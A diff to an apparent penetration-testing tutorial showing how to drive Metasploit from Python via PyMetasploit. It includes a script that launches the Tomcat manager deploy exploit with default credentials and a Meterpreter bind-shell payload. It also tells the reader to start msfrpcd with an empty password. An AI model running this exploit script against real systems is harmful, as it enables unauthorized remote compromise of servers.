@@ -156,34 +156,23 @@ In the example below the auto smb enum script is run against HTB machines "Optim
 Useful for most engagements.
 
 
-### <a id="Going Deeper by Using Python"></a>Python
+### <a id="#Python"></a>Going Deeper by Using Python
 
 What if MSF could be combined with the hackers favorite programming language python? Much could be achieved indeed. Luckily such a framework exists, namely PyMetasploit⁴ which is somewhat newer than Spiderlabs msfrpc⁵. For installation of either refer to the respective Github repos⁴/⁵. PyMetasploit describes itself as:
 
 > _PyMetasploit is a full-fledged msfrpc library for Python. It is meant to interact with the msfrpcd daemon that comes with the latest versions of Metasploit. It does NOT interact with the console-based scripts that Metasploit provides such as msfconsole, msfvenom, etc. Therefore, before you can begin to use this library, you'll need to initialize msfrpcd and optionally (highly recommended) PostgreSQL._
 
-So informed lets learn from the following example⁶:
+So informed lets learn from the following example⁶, which should be safed as 'exploit_tomcat_maanger.py' in PyMetasploit folder:
 
 ```
-from Metasploit.msfrpc import MsfRpcClient
-from Metasploit.msfconsole import MsfRpcConsole
+import metasploit.msfrpc
+from metasploit.msfconsole import MsfRpcConsole
 
-client = MsfRpcClient('password', user='msf')
+client = metasploit.msfrpc.MsfRpcClient('', user='msf')
 
 exploits = client.modules.exploits
 for exploit in exploits:
     print("\t%s" % exploit)
-
-scan = client.modules.use('exploits', 'multi/http/tomcat_mgr_deploy')
-scan.description
-scan.required
-scan['RHOST'] = '192.168.100.2'
-scan['RPORT'] = '8180'
-scan['PATH'] = '/manager'
-scan['HttpUsername'] = 'tomcat'
-scan['HttpPassword'] = 'tomcat'
-scan['payload'] = 'java/meterpreter/bind_tcp'
-print(scan.execute())
 
 console = MsfRpcConsole(client)
 console.execute('use exploit/multi/http/tomcat_mgr_deploy')
@@ -195,6 +184,12 @@ console.execute('set HttpPassword tomcat')
 console.execute('set payload java/meterpreter/bind_tcp')
 console.execute('run')
 ```
+
+Before running the script start a msfrpc instance from command prompt:
+```
+$> msfrpcd -P '' -U msf
+```
+![image](msfrpcdstart.png)
 
 Obviously the two "from/import" lines imports the msfrpc modules in usual python fashion and enables os to work with Msfrpc. The code:
 
@@ -211,14 +206,18 @@ client.modules.payloads
 client.modules.post
 ```
 
-We can activate one of these exploits with the use method:
+After the console initiated one can activate an exploit with the use method:
 
-scan = client.modules.use('exploits', 'multi/http/tomcat_mgr_deploy')
+```
+console.execute('use exploit/multi/http/tomcat_mgr_deploy')
+```
+
+Which is comparable to command that is used for msfconsole, same goes for the following lines of code. The same goes the scripts following "console.execute" commands.
 
 
-### <a id="TopicN"></a>TopicN
+![image](pymsfrpcd.png)
 
-_Your text here_
+The above screenshot shows the executing of the script.
 
 
 ### <a id="Conclusion"></a>Conclusion
